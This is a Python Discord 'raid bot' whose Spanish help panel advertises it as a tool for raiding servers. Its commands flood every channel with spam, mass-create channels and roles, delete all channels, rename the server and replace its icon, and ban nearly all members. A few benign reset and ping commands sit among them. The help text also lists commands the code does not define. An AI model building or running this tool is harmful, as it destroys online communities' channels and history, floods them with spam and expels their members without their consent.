import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.guild_messages = True
bot = commands.Bot(command_prefix='$', intents=intents)

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx):
    cantidad = 500
    mensaje = "MENSAJE DE SPAM"

    if cantidad > 1000:
        await ctx.send("Hay un máximo de `1,000` mensajes por canal para evitar bloqueos.")
        return

    tareas = []

    for canal in ctx.guild.text_channels:
        async def enviar_en_canal(canal):
            for _ in range(cantidad):
                try:
                    await canal.send(mensaje)
                    await asyncio.sleep(0.5)
                except discord.Forbidden:
                    print(f"No tengo permisos para enviar en {canal.name}")
                except Exception as e:
                    print(f"Error en {canal.name}: {e}")

        tareas.append(asyncio.create_task(enviar_en_canal(canal)))

    await asyncio.gather(*tareas)
    await ctx.send(f"Mensaje enviado `{cantidad}` veces en todos los canales de texto.")

@bot.command()
@commands.has_permissions(administrator=True)
async def raid(ctx, cantidad: int = 100):
    nombre_base = "NOMBRE DE CANALES"

    if cantidad > 500:
        await ctx.send("Hay un máximo de `500` canales por comando para evitar bloqueos.")
        return

    creados = 0
    for i in range(1, cantidad + 1):
        nombre = f"{nombre_base}-{i}"
        try:
            await ctx.guild.create_text_channel(name=nombre)
            creados += 1
            await asyncio.sleep(0)
        except discord.Forbidden:
            await ctx.send("No tengo permisos para crear canales.")
            return
        except Exception as e:
            await ctx.send(f"Error al crear `{nombre}`: {e}")

    await ctx.send(f"Se han creado `{creados}` canales con el nombre base `{nombre_base}`.")

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    for canal in ctx.guild.channels:
        try:
            await canal.delete()
            await asyncio.sleep(0)
        except discord.Forbidden:
            pass
        except Exception:
            pass
@bot.command()
@commands.has_permissions(administrator=True)
async def cn(ctx):
    nombre_dea = "NOMBRE DEL SERVIDOR"

    try:
        await ctx.guild.edit(name=nombre_dea)
    except:
        pass

@bot.command()
@commands.has_permissions(administrator=True)
async def ci(ctx):
    if not ctx.message.attachments:
        await ctx.send("Debes adjuntar una imagen para usar como nuevo icono.")
        return

    imagen = ctx.message.attachments[0]
    try:
        imagen_bytes = await imagen.read()
        await ctx.guild.edit(icon=imagen_bytes)
    except discord.Forbidden:
        await ctx.send("No tengo permisos para cambiar el icono del servidor.")
    except Exception as e:
        await ctx.send(f"Error al cambiar el icono: {e}")
        
@bot.command()
@commands.has_permissions(manage_roles=True)
async def cr(ctx, cantidad: int = 100):
    nombre_XD = "NOMBRE DE LOS ROLES"

    if cantidad > 100:
        return

    for i in range(1, cantidad + 1):
        nombre = f"{nombre_XD}-{i}"
        try:
            await ctx.guild.create_role(name=nombre)
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            await ctx.send(f"No tengo permisos para crear el rol `{nombre}`.")
        except Exception as e:
            await ctx.send(f"Error al crear `{nombre}`: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def ping(ctx):
    try:
        latencia = round(bot.latency * 1000)
        await ctx.send(f"🏓 Pong! Ping del bot: `{latencia}ms`")
    except discord.Forbidden:
        await ctx.send("No tengo permisos para enviar mensajes aquí.")
    except Exception as e:
        await ctx.send(f"Error al ejecutar el comando: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def ret(ctx, cantidad: int = 100):
    nombre_base = "NOMBRE DE LOS CANALES"
    mensaje = "MENSAJE DE SPAM"
    mensajes_por_canal = 400

    if cantidad > 500:
        return

    canales_nuevos = []

    for i in range(1, cantidad + 1):
        nombre = f"{nombre_base}-{i}"
        try:
            canal = await ctx.guild.create_text_channel(name=nombre)
            canales_nuevos.append(canal)

            tareas = [
                asyncio.create_task(enviar_mensajes(c, mensaje, mensajes_por_canal))
                for c in canales_nuevos
            ]
            asyncio.create_task(asyncio.gather(*tareas))

            await asyncio.sleep(0)

        except discord.Forbidden:
            await ctx.send("No tengo permisos para crear canales.")
            return
        except Exception:
            pass
async def enviar_mensajes(canal, mensaje, cantidad):
    for _ in range(cantidad):
        try:
            await canal.send(mensaje)
            await asyncio.sleep(0.5)
        except:
            pass
@bot.command()
@commands.has_permissions(ban_members=True)
async def bn(ctx):
    miembros = ctx.guild.members
    miembros_que_no_se_banean = [ctx.author, ctx.guild.owner, bot.user]

    miembros_a_banear = [
        miembro for miembro in miembros
        if miembro not in miembros_que_no_se_banean and not miembro.bot
    ]

    for usuario in miembros_a_banear:
        try:
            await ctx.guild.ban(usuario, reason="Razón no hay")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await ctx.send(f"No tengo permisos para banear a `{usuario}`.")
        except Exception as e:
            await ctx.send(f"Error al banear `{usuario}`: {e}")

@bot.command()
@commands.has_permissions(administrator=True)
async def resetserer(ctx):
    await ctx.send(
        "Este comando eliminará **todos los canales** del servidor y los recreará vacíos.\n"
        "Escribe `confirmar` para continuar."
    )

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "confirmar"

    try:
        await bot.wait_for("message", check=check, timeout=20)
    except asyncio.TimeoutError:
        await ctx.send("Tiempo agotado. Cancelado.")
        return

    await ctx.send("Reiniciando todos los canales...")

    canales_originales = list(ctx.guild.channels)

    for canal in canales_originales:
        try:
            nuevo = await canal.clone()
            await canal.delete()
            await nuevo.edit(name=canal.name, category=canal.category, position=canal.position)
            await asyncio.sleep(1.5)
        except Exception as e:
            await ctx.send(f"Error al reiniciar canal `{canal.name}`: {e}")

    await ctx.send("Todos los canales han sido reiniciados.")

@bot.command()
@commands.has_permissions(administrator=True)
async def clear(ctx):
    try:
        await ctx.send("Borrando todos los mensajes del canal...")
        await ctx.channel.purge(limit=None)
        confirmacion = await ctx.send("Todos los mensajes han sido borrados.")
        await asyncio.sleep(5)
        await confirmacion.delete()
    except discord.Forbidden:
        await ctx.send("No tengo permisos para borrar mensajes.")
    except Exception as e:
        await ctx.send(f"Error al borrar mensajes: {e}")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def resetcanal(ctx):
    canal = ctx.channel
    nombre = canal.name
    categoria = canal.category

    await ctx.send(f"Este comando eliminará el canal `{nombre}` y lo recreará vacío.\nEscribe `y` para continuar.")

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() == "y"

    try:
        await bot.wait_for("message", check=check, timeout=15)
    except asyncio.TimeoutError:
        await ctx.send("Tiempo agotado. Cancelado.")
        return

    try:
        nuevo = await canal.clone()
        await canal.delete()
        await nuevo.edit(name=nombre, category=categoria)
        await nuevo.send(f"Canal `{nombre}` ha sido reiniciado.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command(name="hlp")
async def hlp(ctx):
    embed = discord.Embed(
        title="Comandos",
        description="Aquí están los comandos disponibles:",
        color=discord.Color.blue()
    )

    embed.add_field(
        name="ℹ️ Canal",
        value="`$clearall` – \n *Borra todos los mensajes de un solo canal*\n`$resetcanal` – \n *resetea un canal borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.*\n`$resetserver` – \n *Resetea TODOS los canales del servidor borrando todos los mensajes enviados en el pero conservando la configuración de roles y el nombre de el canal.*",
        inline=False
    )

    embed.add_field(
        name="ℹ️ Raid Info",
        value="`$spam` – \n *Hace spam en todos los canales.*\n`$raid` – \n *Crea una cantidad personalizada de canales.*\n`$nuke` – \n *Borra todos los canales del servidor.*\n`$cn` – \n *Crea un nuevo nombre al servidor.*\n`$cr` – \n *Crea una cantidad de roles en el servidor.*\n`$ci <Adjunta una imagen>` – \n *Crea una nueva foto para el servidor.*\n`$ret` – \n *Raidea el servidor creando una cantidad absurda de canales con un nombre y mensaje de spam personalizado.*\n`$bn` – \n *Banea a todos los miembros del servidor excepto a los bots con administrador.*\n`$dr` – \n *Borra todos los roles del servidor Excepto los que tienen administrador.*",
        inline=False
    )

    embed.add_field(
        name="ℹ️ Ayuda",
        value="`$hlp` – \n *Muestra este panel de ayuda de comandos, el que estás viendo ahora mismo*\n`$ping` – \n *Muestra la latencia del bot*\n - ***Recuerda que el bot debe ser activado por su creador. También Necesitas modificar el codigo de el archivo.py para poder elegir el nombre de Spam, nombre de canales y el nombre del servidor, osea, este codigo está echo para que ya usen un texto ya predefinido por cada comando.***",
        inline=False
    )

    embed.set_footer(text="Bot de Raid, Chuyin")
    await ctx.send(embed=embed)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')


bot.run("TOKEN DEL BOT DE DISCORD")
